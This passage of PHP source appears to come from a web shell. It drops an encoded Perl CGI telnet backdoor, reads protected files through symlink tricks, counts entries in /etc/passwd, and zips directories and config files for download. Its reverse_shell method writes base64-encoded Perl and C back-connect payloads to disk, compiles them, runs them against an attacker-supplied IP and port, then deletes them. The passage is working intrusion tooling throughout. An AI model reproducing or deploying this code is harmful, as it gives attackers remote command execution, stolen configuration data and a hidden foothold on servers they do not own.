HlwZTogYXBwbGljYXRpb24veC11bmtub3duXG4iOwoJCXByaW50ICJDb250ZW50LUxlbmd0aDogJEZpbGVTaXplXG4iOwoJCXByaW50ICJDb250ZW50LURpc3Bvc2l0aW9uOiBhdHRhY2htZW50OyBmaWxlbmFtZT0kMVxuXG4iOwoJCXByaW50IHdoaWxlKDxTRU5ERklMRT4pOwoJCWNsb3NlKFNFTkRGSUxFKTsKCX0KCWVsc2UgIyBmYWlsZWQgdG8gb3BlbiBmaWxlCgl7CgkJJlByaW50UGFnZUhlYWRlcigiZiIpOwoJCXByaW50ICI8Y29kZT5GYWlsZWQgdG8gZG93bmxvYWQgJFNlbmRGaWxlOiAkITwvY29kZT4iOwoJCSZQcmludEZpbGVEb3dubG9hZEZvcm07CgkJJlByaW50UGFnZUZvb3RlcjsKCX0KfQoKCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB3aGVuIHRoZSB1c2VyIGRvd25sb2FkcyBhIGZpbGUuIEl0IGRpc3BsYXlzIGEgbWVzc2FnZQojIHRvIHRoZSB1c2VyIGFuZCBwcm92aWRlcyBhIGxpbmsgdGhyb3VnaCB3aGljaCB0aGUgZmlsZSBjYW4gYmUgZG93bmxvYWRlZC4KIyBUaGlzIGZ1bmN0aW9uIGlzIGFsc28gY2FsbGVkIHdoZW4gdGhlIHVzZXIgY2xpY2tzIG9uIHRoYXQgbGluay4gSW4gdGhpcyBjYXNlLAojIHRoZSBmaWxlIGlzIHJlYWQgYW5kIHNlbnQgdG8gdGhlIGJyb3dzZXIuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIEJlZ2luRG93bmxvYWQKewoJIyBnZXQgZnVsbHkgcXVhbGlmaWVkIHBhdGggb2YgdGhlIGZpbGUgdG8gYmUgZG93bmxvYWRlZAoJaWYoKCRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlxcfF4uOi8pKSB8CgkJKCEkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cLy8pKSkgIyBwYXRoIGlzIGFic29sdXRlCgl7CgkJJFRhcmdldEZpbGUgPSAkVHJhbnNmZXJGaWxlOwoJfQoJZWxzZSAjIHBhdGggaXMgcmVsYXRpdmUKCXsKCQljaG9wKCRUYXJnZXRGaWxlKSBpZigkVGFyZ2V0RmlsZSA9ICRDdXJyZW50RGlyKSA9fiBtL1tcXFwvXSQvOwoJCSRUYXJnZXRGaWxlIC49ICRQYXRoU2VwLiRUcmFuc2ZlckZpbGU7Cgl9CgoJaWYoJE9wdGlvbnMgZXEgImdvIikgIyB3ZSBoYXZlIHRvIHNlbmQgdGhlIGZpbGUKCXsKCQkmU2VuZEZpbGVUb0Jyb3dzZXIoJFRhcmdldEZpbGUpOwoJfQoJZWxzZSAjIHdlIGhhdmUgdG8gc2VuZCBvbmx5IHRoZSBsaW5rIHBhZ2UKCXsKCQkmUHJpbnREb3dubG9hZExpbmtQYWdlKCRUYXJnZXRGaWxlKTsKCX0KfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHVzZXIgd2FudHMgdG8gdXBsb2FkIGEgZmlsZS4gSWYgdGhlCiMgZmlsZSBpcyBub3Qgc3BlY2lmaWVkLCBpdCBkaXNwbGF5cyBhIGZvcm0gYWxsb3dpbmcgdGhlIHVzZXIgdG8gc3BlY2lmeSBhCiMgZmlsZSwgb3RoZXJ3aXNlIGl0IHN0YXJ0cyB0aGUgdXBsb2FkIHByb2Nlc3MuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFVwbG9hZEZpbGUKewoJIyBpZiBubyBmaWxlIGlzIHNwZWNpZmllZCwgcHJpbnQgdGhlIHVwbG9hZCBmb3JtIGFnYWluCglpZigkVHJhbnNmZXJGaWxlIGVxICIiKQoJewoJCSZQcmludFBhZ2VIZWFkZXIoImYiKTsKCQkmUHJpbnRGaWxlVXBsb2FkRm9ybTsKCQkmUHJpbnRQYWdlRm9vdGVyOwoJCXJldHVybjsKCX0KCSZQcmludFBhZ2VIZWFkZXIoImMiKTsKCgkjIHN0YXJ0IHRoZSB1cGxvYWRpbmcgcHJvY2VzcwoJcHJpbnQgIjxjb2RlPlVwbG9hZGluZyAkVHJhbnNmZXJGaWxlIHRvICRDdXJyZW50RGlyLi4uPGJyPiI7CgoJIyBnZXQgdGhlIGZ1bGxseSBxdWFsaWZpZWQgcGF0aG5hbWUgb2YgdGhlIGZpbGUgdG8gYmUgY3JlYXRlZAoJY2hvcCgkVGFyZ2V0TmFtZSkgaWYgKCRUYXJnZXROYW1lID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87CgkkVHJhbnNmZXJGaWxlID1+IG0hKFteL15cXF0qKSQhOwoJJFRhcmdldE5hbWUgLj0gJFBhdGhTZXAuJDE7CgoJJFRhcmdldEZpbGVTaXplID0gbGVuZ3RoKCRpbnsnZmlsZWRhdGEnfSk7CgkjIGlmIHRoZSBmaWxlIGV4aXN0cyBhbmQgd2UgYXJlIG5vdCBzdXBwb3NlZCB0byBvdmVyd3JpdGUgaXQKCWlmKC1lICRUYXJnZXROYW1lICYmICRPcHRpb25zIG5lICJvdmVyd3JpdGUiKQoJewoJCXByaW50ICJGYWlsZWQ6IERlc3RpbmF0aW9uIGZpbGUgYWxyZWFkeSBleGlzdHMuPGJyPiI7Cgl9CgllbHNlICMgZmlsZSBpcyBub3QgcHJlc2VudAoJewoJCWlmKG9wZW4oVVBMT0FERklMRSwgIj4kVGFyZ2V0TmFtZSIpKQoJCXsKCQkJYmlubW9kZShVUExPQURGSUxFKSBpZiAkV2luTlQ7CgkJCXByaW50IFVQTE9BREZJTEUgJGlueydmaWxlZGF0YSd9OwoJCQljbG9zZShVUExPQURGSUxFKTsKCQkJcHJpbnQgIlRyYW5zZmVyZWQgJFRhcmdldEZpbGVTaXplIEJ5dGVzLjxicj4iOwoJCQlwcmludCAiRmlsZSBQYXRoOiAkVGFyZ2V0TmFtZTxicj4iOwoJCX0KCQllbHNlCgkJewoJCQlwcmludCAiRmFpbGVkOiAkITxicj4iOwoJCX0KCX0KCXByaW50ICI8L2NvZGU+IjsKCSZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOwoJJlByaW50UGFnZUZvb3RlcjsKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHVzZXIgd2FudHMgdG8gZG93bmxvYWQgYSBmaWxlLiBJZiB0aGUKIyBmaWxlbmFtZSBpcyBub3Qgc3BlY2lmaWVkLCBpdCBkaXNwbGF5cyBhIGZvcm0gYWxsb3dpbmcgdGhlIHVzZXIgdG8gc3BlY2lmeSBhCiMgZmlsZSwgb3RoZXJ3aXNlIGl0IGRpc3BsYXlzIGEgbWVzc2FnZSB0byB0aGUgdXNlciBhbmQgcHJvdmlkZXMgYSBsaW5rCiMgdGhyb3VnaCAgd2hpY2ggdGhlIGZpbGUgY2FuIGJlIGRvd25sb2FkZWQuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIERvd25sb2FkRmlsZQp7CgkjIGlmIG5vIGZpbGUgaXMgc3BlY2lmaWVkLCBwcmludCB0aGUgZG93bmxvYWQgZm9ybSBhZ2FpbgoJaWYoJFRyYW5zZmVyRmlsZSBlcSAiIikKCXsKCQkmUHJpbnRQYWdlSGVhZGVyKCJmIik7CgkJJlByaW50RmlsZURvd25sb2FkRm9ybTsKCQkmUHJpbnRQYWdlRm9vdGVyOwoJCXJldHVybjsKCX0KCQoJIyBnZXQgZnVsbHkgcXVhbGlmaWVkIHBhdGggb2YgdGhlIGZpbGUgdG8gYmUgZG93bmxvYWRlZAoJaWYoKCRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlxcfF4uOi8pKSB8CgkJKCEkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cLy8pKSkgIyBwYXRoIGlzIGFic29sdXRlCgl7CgkJJFRhcmdldEZpbGUgPSAkVHJhbnNmZXJGaWxlOwoJfQoJZWxzZSAjIHBhdGggaXMgcmVsYXRpdmUKCXsKCQljaG9wKCRUYXJnZXRGaWxlKSBpZigkVGFyZ2V0RmlsZSA9ICRDdXJyZW50RGlyKSA9fiBtL1tcXFwvXSQvOwoJCSRUYXJnZXRGaWxlIC49ICRQYXRoU2VwLiRUcmFuc2ZlckZpbGU7Cgl9CgoJaWYoJE9wdGlvbnMgZXEgImdvIikgIyB3ZSBoYXZlIHRvIHNlbmQgdGhlIGZpbGUKCXsKCQkmU2VuZEZpbGVUb0Jyb3dzZXIoJFRhcmdldEZpbGUpOwoJfQoJZWxzZSAjIHdlIGhhdmUgdG8gc2VuZCBvbmx5IHRoZSBsaW5rIHBhZ2UKCXsKCQkmUHJpbnREb3dubG9hZExpbmtQYWdlKCRUYXJnZXRGaWxlKTsKCX0KfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIE1haW4gUHJvZ3JhbSAtIEV4ZWN1dGlvbiBTdGFydHMgSGVyZQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiZSZWFkUGFyc2U7CiZHZXRDb29raWVzOwoKJFNjcmlwdExvY2F0aW9uID0gJEVOVnsnU0NSSVBUX05BTUUnfTsKJFNlcnZlck5hbWUgPSAkRU5WeydTRVJWRVJfTkFNRSd9OwokTG9naW5QYXNzd29yZCA9ICRpbnsncCd9OwokUnVuQ29tbWFuZCA9ICRpbnsnYyd9OwokVHJhbnNmZXJGaWxlID0gJGlueydmJ307CiRPcHRpb25zID0gJGlueydvJ307CgokQWN0aW9uID0gJGlueydhJ307CiRBY3Rpb24gPSAibG9naW4iIGlmKCRBY3Rpb24gZXEgIiIpOyAjIG5vIGFjdGlvbiBzcGVjaWZpZWQsIHVzZSBkZWZhdWx0CgojIGdldCB0aGUgZGlyZWN0b3J5IGluIHdoaWNoIHRoZSBjb21tYW5kcyB3aWxsIGJlIGV4ZWN1dGVkCiRDdXJyZW50RGlyID0gJGlueydkJ307CmNob3AoJEN1cnJlbnREaXIgPSBgJENtZFB3ZGApIGlmKCRDdXJyZW50RGlyIGVxICIiKTsKCiRMb2dnZWRJbiA9ICRDb29raWVzeydTQVZFRFBXRCd9IGVxICRQYXNzd29yZDsKCmlmKCRBY3Rpb24gZXEgImxvZ2luIiB8fCAhJExvZ2dlZEluKSAjIHVzZXIgbmVlZHMvaGFzIHRvIGxvZ2luCnsKCSZQZXJmb3JtTG9naW47Cn0KZWxzaWYoJEFjdGlvbiBlcSAiY29tbWFuZCIpICMgdXNlciB3YW50cyB0byBydW4gYSBjb21tYW5kCnsKCSZFeGVjdXRlQ29tbWFuZDsKfQplbHNpZigkQWN0aW9uIGVxICJ1cGxvYWQiKSAjIHVzZXIgd2FudHMgdG8gdXBsb2FkIGEgZmlsZQp7CgkmVXBsb2FkRmlsZTsKfQplbHNpZigkQWN0aW9uIGVxICJkb3dubG9hZCIpICMgdXNlciB3YW50cyB0byBkb3dubG9hZCBhIGZpbGUKewoJJkRvd25sb2FkRmlsZTsKfQplbHNpZigkQWN0aW9uIGVxICJsb2dvdXQiKSAjIHVzZXIgd2FudHMgdG8gbG9nb3V0CnsKCSZQZXJmb3JtTG9nb3V0Owp9');

        if (file_exists($name)) {
            return true;
        } else {

            if (@file_put_contents($name, $cgiTelnetCode)) {
                @chmod($name, octdec("0755"));
                return true;
            } else {
                return false;
            }
        }
    }

    public function create_symlink($target)
    {

        if (!file_exists($target)) {
            return false;
        } else {
            $temp = sys_get_temp_dir() . DIRECTORY_SEPARATOR . uniqid(rand(1, 50)) . ".tmp";

            if (@symlink($target, $temp)) {
                $content = @file_get_contents($temp);
                @unlink($temp);
                return $content;
            } elseif (@link($target, $temp)) {
                $content = @file_get_contents($temp);
                @unlink($temp);
                return $content;
            } else {
                $exec_ln = $this->run_cmd('ln -sf ' . $target . ' ' . $temp);

                if ($exec_ln !== false) {
                    $content = @file_get_contents($temp);
                    @unlink($temp);
                    return $content;
                } else {
                    return false;
                }
            }
        }
    }
    public function prepare_search_cmd($location, $keyword, $type)
    {

        if ($type == 'all') {
            $cmd = 'find "' . $location . '" -iname "*' . $keyword . '*"';
        } elseif ($type == 'files_only') {
            $cmd = 'find "' . $location . '" -type f -iname "*' . $keyword . '*"';
        } elseif ($type == 'dirs_only') {
            $cmd = 'find "' . $location . '" -type d -iname "*' . $keyword . '*"';
        }
        return $cmd;
    }
    public function get_users_count()
    {
        if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
            return 'Windows not supported';
        } else {

            $read_as_arr = @array_map('trim', @file('/etc/passwd'));
            return count($read_as_arr);
        }
    }
    public function get_groups_count()
    {
        if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
            return 'Windows not supported';
        } else {
            $read_as_arr = @array_map('trim', @file('/etc/group'));
            return count($read_as_arr);
        }
    }
    public function download_as_zip($target)
    {
        // https://stackoverflow.com/questions/55927020/how-to-zip-an-entire-folder-in-php-even-the-empty-ones
        if (!is_readable($target)) return false;
        $rootPath    = realpath($target);
        $zipFilename = $_SERVER['HTTP_HOST'] . '-' . uniqid() . '.zip';
        $zip = new ZipArchive();
        if ($zip->open($zipFilename, ZipArchive::CREATE)) {
            /** @var SplFileInfo[] $files */
            $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($rootPath), RecursiveIteratorIterator::LEAVES_ONLY);

            foreach ($files as $name => $file) {
                $filePath = $file->getRealPath();
                $relativePath = substr($filePath, strlen($rootPath) + 1);

                if (!$file->isDir()) {
                    // Add current file to archive
                    $zip->addFile($filePath, $relativePath);
                } else {
                    if ($relativePath !== false)
                        $zip->addEmptyDir($relativePath);
                }
            }
            if ($zip->status == ZipArchive::ER_OK) {
                $zip->close();
                return $zipFilename;
            } else {
                $zip->close();
                return false;
            }
        } else {
            return false;
        }
    }
    public function download_configs($configs)
    {
        $configs = explode("\n", $configs);
        $configs = array_filter($configs);
        $configs = array_unique($configs);
        $configs = array_map('trim', $configs);
        $zipTemp = $_SERVER['HTTP_HOST'] . '-configs.zip';
        $zip     = new ZipArchive();

        if ($zip->open($zipTemp, ZipArchive::CREATE)) {

            foreach ($configs as $config) {
                $zip->addFile($config, basename($config));
            }
            if ($zip->status == ZipArchive::ER_OK) {
                $zip->close();
                return $zipTemp;
            } else {
                $zip->close();
                return false;
            }
        } else {
            return false;
        }
    }
    public function reverse_shell($ip, $port, $method)
    {

        if ($method == "perl") {
            $back_connect_pl = "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj
            aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR
            hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT
            sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI
            kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi
            KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl
            OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";

            $perl_path = 'mws_rev.pl';
            if (@file_put_contents($perl_path, base64_decode($back_connect_pl))) {
                @chmod($perl_path, octdec("0755"));
                $exec_command = $this->run_cmd("perl $perl_path $ip $port &");

                if ($exec_command !== false) {
                    @unlink($perl_path);
                    return true;
                } else {
                    @unlink($perl_path);
                    return false;
                }
            } else {
                return false;
            }
        } else {
            $back_connect_c = "I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC
            BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb
            SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd
            KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ
            sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC
            Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D
            QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp
            Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==";

            $c_path = 'mws_rev_c.c';

            if (@file_put_contents($c_path, base64_decode($back_connect_c))) {
                $compile = $this->run_cmd("gcc -o mws_rev_c $c_path");

                if ($compile !== false) {
                    if (file_exists('mws_rev_c')) {
                        @unlink($c_path);
                        @chmod('mws_rev_c', octdec("0755"));
                        $exec_command = $this->run_cmd("./mws_rev_c $ip $port &");
                        if ($exec_command !== false) {
                            @unlink('mws_rev_c');
                            return true;
                        } else {
                            @unlink('mws_rev_c');
                            return false;
                        }
                    } else {
                        @unlink($c_path);
                        return false;
                    }
                } else {
                    @unlink($c_path);
                    return false;
                }
            } else {
                return false;
            }
        }
    }

    public function get_ip_information()
    {
        $informations = array();

        $server_ip = $_SERVER['SERVER_ADDR'];

        $sites     = array(
            'http://ip-api.com/json/' . $server_ip,
            'https://ipwhois.app/json/' . $server_ip,
            'https://ipapi.co/' . $server_ip . '/json/',
            'https://free.ipdetails.io/' . $server_ip,
            'https://ipinfo.io/' . $server_ip . '/json'
        );

        foreach ($sites as $key => $lookup_addr) {
            if (function_exists('curl_init')) {
                $curl      =  curl_init();
                curl_setopt_array($curl, array(
                    CURLOPT_RETURNTRANSFER => 1,
                    CURLOPT_FOLLOWLOCATION => true,
                    CURLOPT_SSL_VERIFYHOST => 0,
                    CURLOPT_SSL_VERIFYPEER => 0,
                    CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72',
                    CURLOPT_URL => $lookup_addr,
                    CURLOPT_TIMEOUT => 10
                ));

                $content   = curl_exec($curl);
                curl_close($curl);
            } elseif (function_exists('file_get_contents')) {
                $options = stream_context_create(array("http" => array("timeout" => 10)));
                $content = file_get_contents($lookup_addr, false, $options);
            } elseif (function_exists('fopen')) {
                $options = stream_context_create(array("http" => array("timeout" => 10)));
                $fopen = fopen($lookup_addr, 'r', false, $options);

                if ($fopen) {
                    $content = '';
                    while ($read = fread($fopen, 1024)) {
                        $content .= $read;
                    }
                    fclose($fopen);
                }
            }
            if ($content) {
                $decode = json_decode($content);
                if ($key == 0) {
                    if ($decode->status) {
                        $informations['ip']      = $server_ip;
                        $informations['country'] = $decode->country;
                        $informations['city'] = $decode->city;
                        $informations['region'] = $decode->regionName;
                        $informations['timezone'] = $decode->timezone;
                    } else {
                        $informations['ip']      = $server_ip;
                        $informations['country'] = 'Unknown';
                        $informations['city'] = 'Unknown';
                        $informations['region'] = 'Unknown';
                        $informations['timezone'] = 'Unknown';
                    }
                } elseif ($key == 1) {
                    if ($decode->success) {
                        $informations['ip']      = $server_ip;
                        $informations['country'] = $decode->country;
                        $informations['city'] = $decode->city;
                        $informations['region'] = $decode->region;
                        $informations['timezone'] = $decode->timezone;
                    } else {
                        $informations['ip']      = $server_ip;
                        $informations['country'] = 'Unknown';
                        $informations['city'] = 'Unknown';
                        $informations['region'] = 'Unknown';
                        $informations['timezone'] = 'Unknown';
                    }
                } elseif ($key == 2) {
                    if ($decode->country_name) {
                        $informations['ip']      = $server_ip;
                        $informations['country'] = $decode->country_name;
                        $informations['city'] = $decode->city;
                        $informations['region'] = $decode->region;
                        $informations['timezone'] = $decode->timezone;
                    } else {
                        $informations['ip']      = $server_ip;
                        $informations['country'] = 'Unknown';
                        $informations['city'] = 'Unknown';
                        $informations['region'] = 'Unknown';
                        $informations['timezone'] = 'Unknown';
                    }
                } elseif ($key == 3) {
                    if ($decode->status) {
                        $informations['ip']      = $server_ip;
                        $informations['country'] = $decode->country->country_long;
                        $informations['city'] = $decode->region->city;
                        $informations['region'] = $decode->region->region;
                        $informations['timezone'] = $decode->timezone->timezone;
                    } else {
                        $informations['ip']      = $server_ip;
                        $informations['country'] = 'Unknown';
                        $informations['city'] = 'Unknown';
                        $informations['region'] = 'Unknown';
                        $informations['timezone'] = 'Unknown';
                    }
                } elseif ($key == 4) {
                    if ($decode->country) {
                        $informations['ip']      = $server_ip;
                        $informations['country'] = $decode->country;
                        $informations['city'] = $decode->city;
                        $informations['region'] = $decode->region;
                        $informations['timezone'] = $decode->timezone;
                    } else {
                        $informations['ip']      = $server_ip;
                        $informations['country'] = 'Unknown';
                        $informations['city'] = 'Unknown';
                        $informations['region'] = 'Unknown';
                        $informations['timezone'] = 'Unknown';
                    }
                }
            }

            if (!empty($informations)) break;
        }

        return $informations;
    }
    public function getMimeType($filename)
    {
        $realpath = realpath($filename);
        if (
            $realpath
            && function_exists('finfo_file')
            && function_exists('finfo_open')
            && defined('FILEINFO_MIME_TYPE')
        ) {
            // Use the Fileinfo PECL extension (PHP 5.3+)
            return finfo_file(finfo_open(FILEINFO_MIME_TYPE), $realpath);
        }
        if (function_exists('mime_content_type')) {
            // Deprecated in PHP 5.3
            return mime_content_type($realpath);
        }
        return false;
    }
}
?>